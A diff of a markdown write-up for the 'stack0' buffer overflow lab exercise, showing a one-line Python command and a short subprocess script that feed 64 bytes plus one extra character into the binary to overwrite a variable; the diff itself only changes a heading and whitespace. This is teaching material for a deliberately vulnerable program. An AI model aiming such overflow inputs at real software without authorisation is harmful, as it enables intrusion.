@@ -34,16 +34,16 @@ since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modi
 ```bash
 python -c "print 'a'*64+'1'" | ./stack0
 ```
-###Python exploit script for this challenge
+###Python exploit:
 ```Python
 from subprocess import Popen, PIPE
 ################
-buffer = 64
-fill = "A"*buffer
-input=fill+"1"
+buffer = 64 
+fill = "A"*buffer  
+input=fill+"1"      
 #################
 cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
-print cproc.communicate(input)[0]
+print cproc.communicate(input)[0]   
 ```
 
 ---------------------------------------------------------------------------------------------------------------------
